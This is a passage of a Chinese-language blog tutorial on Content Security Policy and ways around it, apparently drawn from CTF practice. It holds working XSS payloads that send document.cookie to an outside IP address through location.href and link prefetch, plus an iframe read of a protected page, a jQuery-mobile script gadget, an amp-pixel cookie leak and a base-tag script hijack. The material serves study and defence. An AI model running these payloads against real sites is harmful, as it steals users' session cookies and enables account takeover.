+</span></span><span class="line"><span class="cl">            <span class="k">background-color</span><span class="p">:</span> <span class="kc">white</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">padding</span><span class="p">:</span> <span class="mi">15</span><span class="kt">px</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">margin</span><span class="p">:</span> <span class="mi">10</span><span class="kt">px</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">border-radius</span><span class="p">:</span> <span class="mi">4</span><span class="kt">px</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">box-shadow</span><span class="p">:</span> <span class="mi">0</span> <span class="mi">2</span><span class="kt">px</span> <span class="mi">4</span><span class="kt">px</span> <span class="nb">rgba</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mf">0.1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://fonts.googleapis.com/css2?family=Roboto&amp;display=swap&#34;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;container&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>留言板<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;messageForm&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> 
+</span></span><span class="line"><span class="cl">                   <span class="na">id</span><span class="o">=</span><span class="s">&#34;messageInput&#34;</span> 
+</span></span><span class="line"><span class="cl">                   <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;输入你的留言...&#34;</span>
+</span></span><span class="line"><span class="cl">                   <span class="na">required</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span><span class="p">&gt;</span>提交<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;messages&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&#34;2726c7f26c9&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;messageForm&#39;</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;submit&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">messageInput</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;messageInput&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">messageInput</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">trim</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">message</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="kr">const</span> <span class="nx">messageElement</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">messageElement</span><span class="p">.</span><span class="nx">className</span> <span class="o">=</span> <span class="s1">&#39;message-item&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">messageElement</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">message</span><span class="p">;</span> <span class="c1">// 使用textContent而不是innerHTML防止XSS
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                
+</span></span><span class="line"><span class="cl">                <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;messages&#39;</span><span class="p">).</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">messageElement</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">messageInput</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>简单解析一下：</p>
+<ul>
+<li><code>default-src 'self'</code>：讲其他没设定的资源设置为同源。</li>
+<li><code>script-src 'self' 'nonce-2726c7f26c9'</code>：允许同源脚本，并且使用了nonce来允许特定内联脚本。</li>
+</ul>
+<p>这里有个需要说明一下，看后面的<code>&lt;style&gt;</code>等标签，都是设置了内联token的，这里我们可以通过动态的设置这个token，来达到是否执行这个脚本的问题，在这个前端中，是直接通过<code>&lt;meta&gt;</code>标签来设置的，同样的，动态的话还可以通过HTTP响应头来设置.可以简单改改前面的前端脚本来自己理解一下。</p>
+<ul>
+<li><code>style-src 'self' https://fonts.googleapis.com</code>：允许同源样式和Google Fonts的样式</li>
+<li><code>font-src https://fonts.gstatic.com</code>：允许从Google字体服务器加载字体。</li>
+<li><code> img-src 'self' data:</code>：允许同源图片和data URL图片</li>
+<li><code>object-src 'none'</code>：禁用所有插件内容</li>
+<li><code>form-action 'self'</code>：限制表单只能提交到同源地址</li>
+</ul>
+<p><strong>注意</strong>：如果设置了多个条件，只需要满足其中一个条件就会允许匹配，两个条件是独立的。</p>
+<p>这里的js代码也是比较也有点意思，是将留言的内容写入到DOM树的，通过Javascript来动态加载的，直接看ctrl+u是看不到的，可以去搭个前端了解一下。</p>
+<p>看了上面的代码，会对CSP的限制会更加清楚，如下说明一下绕过方法。</p>
+<h4 id="绕过手段">绕过手段
+</h4><p>这里就说说一下比较有意思的点。</p>
+<h5 id="可以动态执行任意js脚本">可以动态执行任意js脚本
+</h5><p>当然是存在CSP限制啦，只不过设置的csp为<code>script-src 'unsafe-inline'</code>，也就是允许<code>&lt;script&gt;</code>标签的执行。</p>
+<p>这个绕过方法个人感觉其实不常见，都能随便执行js脚本了。</p>
+<h6 id="locationhref">location.href
+</h6><p>CSP不影响location.href跳转，直接如下打即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span> <span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">&#34;http://47.100.223.173:2333?&#34;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="p">;</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span> <span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">&#34;http://47.100.223.173:2333?&#34;</span><span class="o">+</span><span class="nx">escape</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="link标签的利用">link标签的利用
+</h6><p><strong>老版本的浏览器可用</strong>，当时没有被约束，算是漏掉的，已经被修复了。</p>
+<p>硬写如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;link rel=&#34;prefetch&#34; href=&#34;//47.100.223.173:2333?${cookie}&#34;&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>辩证看待吧，带不出cookie，可能是cookie获取的错误。反正能访问到ip。</p>
+<p>通过js代码如下实现:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="kd">var</span> <span class="nx">link</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;link&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">link</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">&#34;rel&#34;</span><span class="p">,</span> <span class="s2">&#34;prefetch&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">link</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">&#34;href&#34;</span><span class="p">,</span> <span class="s2">&#34;//47.100.223.173:2333/?&#34;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">head</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">link</span><span class="p">);</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样的js代码代码是成功带出来cookie的。</p>
+<p>但是限制都比较大，需要可以执行任意JS脚本。sss</p>
+<h5 id="其他绕过方法">其他绕过方法
+</h5><h6 id="使用iframe标签绕过">使用iframe标签绕过
+</h6><p>所有的主流浏览器都支持<code>&lt;iframe&gt;</code>标签，这个标签的定义就是规定了一个内联框架，也就是它能够将另一个HTML页面嵌入到当前页面中。</p>
+<p>也就是说，可以怎么办，如果我们能够控制当前的web服务中的一个页面的内容，而另外一个页面是有我想要的东西的，此时我们就可以尝试在能控制得页面中使用iframe标签来嵌入另一个页面，然后将其打印处理啊，这样就能成功<strong>绕过CSP的同源限制</strong>得到想要得东西了</p>
+<p>一个简单的示例：</p>
+<p>以原先的留言板的代码为例：</p>
+<p>app.html：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Security-Policy&#34;</span> 
+</span></span><span class="line"><span class="cl">          <span class="na">content</span><span class="o">=</span><span class="s">&#34;default-src &#39;self&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s">                   script-src &#39;self&#39; &#39;nonce-2726c7f26c9&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s">                   style-src &#39;self&#39; https://fonts.googleapis.com;
+</span></span></span><span class="line"><span class="cl"><span class="s">                   font-src https://fonts.gstatic.com;
+</span></span></span><span class="line"><span class="cl"><span class="s">                   img-src &#39;self&#39; data:;
+</span></span></span><span class="line"><span class="cl"><span class="s">                   object-src &#39;none&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s">                   base-uri &#39;self&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s">                   form-action &#39;self&#39;&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;flag&#34;</span><span class="p">&gt;</span>flag{text123}<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>index.html（可控页面）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;iframe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">iframe</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">&#34;src&#34;</span><span class="p">,</span> <span class="s2">&#34;index.html&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">iframe</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="s2">&#34;none&#34;</span><span class="p">;</span> <span class="c1">// 隐藏 iframe
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">iframe</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">flagElement</span> <span class="o">=</span> <span class="nx">iframe</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">flagElement</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">flagElement</span><span class="p">.</span><span class="nx">textContent</span><span class="p">);</span> <span class="c1">// 输出 flag 内容
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Flag not found&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/body&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后尝试如下，成功在控制台输出：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502132038653.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250213203844349"
+	
+	
+></p>
+<p>当然也可以弹窗输出。这里加的setTimeout()函数，是为了让index.html文档加载完。需要注意的是，这里必须要在script标签外面套一个body标签，这样才能成功加载，<strong>可能的原因如下</strong>：</p>
+<p>是因为HTML文档的解析是从上到下执行的，当解析到<code>&lt;script&gt;</code>标签时，会马上执行其中的代码，其实相当于把script放在<code>&lt;body&gt;</code>标签前解析，但是注意我们利用代码中的一步：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">document.body
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里其实是调用到了DOM的一个对象，此时并没有完成初始化，必须要将其放在<code>&lt;body&gt;</code>标签中，简单给个代码对比一下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span> <span class="c1">// 输出 &lt;body&gt; 元素
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/body&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span> <span class="c1">// 输出 null
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/head&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;&lt;</span><span class="err">/body&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>结果如上，简单理解一下就行。</p>
+<p>如果可以的话，可以尝试直接写iframe标签的代码，不用再用js代码来构造：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;index.html&#34;</span> <span class="nx">title</span><span class="o">=</span><span class="s2">&#34;iframe Example&#34;</span> <span class="nx">width</span><span class="o">=</span><span class="s2">&#34;400&#34;</span> <span class="nx">height</span><span class="o">=</span><span class="s2">&#34;300&#34;</span><span class="o">&gt;&lt;</span><span class="err">/iframe&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样就直接获取到了内容：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502132058227.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250213205822178"
+	
+	
+></p>
+<p><strong>需要注意的是</strong>：这里的src可以是一个url。</p>
+<p>利用场景：</p>
+<p>两个页面，其中一个页面可控，并且存在XSS漏洞，这样可访问存在CSP的页面的内容。</p>
+<p>这个标签还有很多技巧，比如它的<code>srcdoc</code>属性等。可以看下面的例题分享。</p>
+<p>对于<code>&lt;iframe&gt;</code>标签。还有的比较有意思的点可以看看如下文章：</p>
+<p><a class="link" href="https://blog.huli.tw/2022/04/07/iframe-and-window-open/#iframe-%E7%9A%84-sandbox"  target="_blank" rel="noopener"
+    >https://blog.huli.tw/2022/04/07/iframe-and-window-open/#iframe-%E7%9A%84-sandbox</a></p>
+<h6 id="cdn绕过">CDN绕过
+</h6><p>一般前端都会用到许多的前端框架和库，简单来说其实就是有些前端会应用其他CDN上的JS框架，但是如果引用的CDN的框架存在什么自定义的标签或其他定义，可以获取cookie等操作，那么此时我们就可以利用这个CDN来绕过CSP。</p>
+<p>但是这个的绕过就一般需要找历史漏洞，或者是挖一个0day出来，简单记录一下：</p>
+<p>如果用了Jquery-mobile库，且CSP中包含<code>script-src 'unsafe-eval</code>或者<code>script-src 'strict-dynamic'</code>，可以用此exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;div data-role=popup id=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;&lt;/div&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>blackhat2017有篇ppt总结了可以被用来绕过CSP的一些JS库：</p>
+<p>《<a class="link" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf"  target="_blank" rel="noopener"
+    >Breaking XSS mitigations via Script Gadgets</a>》</p>
+<p>还有RCTF2018的AMP题出现了这个的利用。主要还是因为AMP自己提供的组件：<code>&lt;amp-pixel&gt;</code>。可以获取到cookie并向指定的网址发送请求。</p>
+<p>简单说说自己的理解，题目docker有点问题，就没有拉起来试试怎么打了：</p>
+<p>CSP限制为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">script-src &#39;nonce-88f68fa5b7eb8a01de8b8e63b5fb0a6e&#39; &#39;strict-dynamic&#39;; style-src &#39;unsafe-inline&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到对script进行了限制，然后对style-src进行了限制，但是这里没有对img-src进行限制，然后没有定义default-src，这里个人认为的可能的原因是这个<code>&lt;amp-pixel&gt;</code>组件是由img-src来定义的：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502132254806.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250213225444753"
+	
+	
+></p>
+<p>最后的payload如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">amp</span><span class="o">-</span><span class="nx">pixel</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;https://foo.com/pixel?cid=CLIENT_ID(site-user-id-cookie-fallback-name)&#34;</span><span class="o">&gt;&lt;</span><span class="err">/amp-pixel&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其他的说明具体参考如下官方文章说明：</p>
+<p>《<a class="link" href="https://amp.dev/zh_cn/documentation/guides-and-tutorials/optimize-and-measure/configure-analytics/analytics_basics#%E7%AE%80%E5%8D%95%E7%9A%84-amp-pixel-%E9%85%8D%E7%BD%AE"  target="_blank" rel="noopener"
+    >Analytics: the basics</a>》</p>
+<p>——————</p>
+<p>可以去看看这道题的wp。</p>
+<h6 id="base-uri绕过">Base-uri绕过
+</h6><p>base-uri的绕过，在RCTF2018 rBlog的非预期解，没找到docker，这里就简单讲讲理解。以及wp中的有意思的点。</p>
+<p>这里提到了一个base-uri，这是一个控制<code>&lt;base&gt;</code>标的CSP指令，对于<code>&lt;base&gt;</code>标签的定义，可以知道的是：</p>
+<ul>
+<li>为页面上的所有的<strong>相对链接</strong>规定默认URL或默认目标，也就是说会将比如<code>&lt;script&gt;</code>、<code>&lt;a&gt;</code>等标签里指向的相对URL都会指向<code>&lt;base&gt;</code>标签中的相对URL。</li>
+<li>必须位于<code>&lt;head&gt;</code>元素内部，一般是靠前的部分。</li>
+<li>一个文档只有一个<code>&lt;base&gt;</code>标签（非常重要，如果不能覆盖掉原有的，那么就不能利用了）</li>
+</ul>
+<p>简单解释一下<code>&lt;base&gt;</code>标签的使用规则：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">base</span><span class="w"> </span><span class="n">href</span><span class="o">=</span><span class="s">&#34;//vps_ip/&#34;</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">script</span><span class="w"> </span><span class="n">nonce</span><span class="o">=</span><span class="err">&#39;</span><span class="n">test</span><span class="err">&#39;</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="s">&#34;app.js&#34;</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>如上设置，那么<code>&lt;script&gt;</code>加载js文件时就会去访问 <code>http://vps_ip/app.js</code>。所以如果想要利用的话，需要在自己的vps上创建一个同名文件，放进js代码即可。</p>
+<p>但是本地测试如下发现：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
